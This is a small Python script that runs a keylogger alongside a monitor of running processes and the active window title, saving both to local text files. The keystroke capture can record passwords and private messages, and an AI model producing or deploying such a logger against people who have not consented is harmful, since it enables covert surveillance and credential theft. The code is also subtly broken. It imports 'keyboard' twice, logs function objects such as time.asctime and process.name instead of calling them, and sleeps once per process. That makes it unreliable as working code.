import time
from pynput import keyboard
import psutil
import pygetwindow as gw
import multiprocessing
import keyboard

#tracks all keystrokes and writes them to a file called output.txt
def write_keystrokes_to_file(file_path):
    with open(file_path, 'w') as f:
        keyboard.hook(lambda event: f.write(event.name + '\n'))
        keyboard.wait('esc')  # Wait for the 'esc' key to stop capturing keystrokes
        keyboard.unhook_all()

# Tracks the current active process and window application every 10 seconds and writes all that data to a text file
def monitor_active_apps_and_processes():
    while True:
        processes = psutil.process_iter()
        for process in processes:
            file_path = "apps+processes.txt"
            active_apps = gw.getActiveWindowTitle()
            with open(file_path, 'a') as file:
                file.write(str(time.asctime))
                file.write("\n")
                file.write(str((process.name)))
                file.write("\n")
                file.write(str((process.ppid)))
                file.write("\n")
                file.write(str((process.status)))
                file.write("\n")
                file.write(str(active_apps))
                file.write("\n")

            process.name()
            process.ppid()
            process.status()

            print("Process Name: ", process.name())
            print("Process ID: ", process.ppid())
            print("Process Status: ", process.status())
            print("Active App: ", active_apps)

            print(time.asctime())

            time.sleep(10)


if __name__ == '__main__':
    file_path = 'output.txt'

    #Defines both functions as a seperate process to be run simultaneously
    p1 = multiprocessing.Process(target=write_keystrokes_to_file, args=[file_path])
    p2 = multiprocessing.Process(target=monitor_active_apps_and_processes, args=[])

    # Starts both the keystrokes function and the monitor processes and active applications functions to run simultaneously
    p1.start()
    p2.start()
